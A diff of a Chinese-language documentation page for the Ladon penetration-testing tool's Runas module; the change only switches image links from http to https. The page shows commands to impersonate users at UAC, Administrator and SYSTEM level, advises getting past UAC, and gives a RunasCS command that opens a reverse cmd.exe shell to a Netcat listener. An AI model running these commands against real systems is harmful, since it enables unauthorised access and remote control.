@@ -214,12 +214,12 @@ window.location.href="http://k8gege.org/Ladon/runas.html";
 <h3 id="测试目的"><a href="#测试目的" class="headerlink" title="测试目的"></a>测试目的</h3><p>以不同权限模拟登陆同一用户执行添加用户命令，对比Runas的执行权限<br>为什么用添加用户权限来对比，因为用户或管理员UAC是无法添加用户的<br>通过是否可添加用户，可轻易区分模拟后的权限到底是具备什么权限</p>
 <h3 id="Uac权限"><a href="#Uac权限" class="headerlink" title="Uac权限"></a>Uac权限</h3><p>非内置管理员用户在UAC权限下执行命令继承UAC权限，无法通过该用户权限添加用户<br>但是模拟内置管理员Administrator权限则不受UAC影响，可以通过该权限添加用户。</p>
 <p>Ladon Runas k8gege k8gege520 whoami<br>Ladon Runas Administrator k8gege520 whoami</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasUac.PNG"></p>
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exe/RunasUac.PNG"></p>
 <h3 id="Administrator权限"><a href="#Administrator权限" class="headerlink" title="Administrator权限"></a>Administrator权限</h3><p>管理员权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
 <h3 id="System权限"><a href="#System权限" class="headerlink" title="System权限"></a>System权限</h3><p>SYSTEM权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
-<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>版本Ladon&gt;=7.8<br>LadonGUI–Netcat监听,执行以下命令即可以指定用户权限反弹shell<br>Ladon RunasCS user pass cmd.exe ip port<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasNC.PNG"></p>
+<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p>
+<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>版本Ladon&gt;=7.8<br>LadonGUI–Netcat监听,执行以下命令即可以指定用户权限反弹shell<br>Ladon RunasCS user pass cmd.exe ip port<br><img alt="image" data-original="https://k8gege.org/k8img/Ladon/exe/RunasNC.PNG"></p>
 <h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>在UAC下需要模拟管理员权限执行命令，先过UAC或使用内置管理员<br>管理员或SYSTEM权限模拟的用户具备什么权限，它就有对应的权限</p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>
 
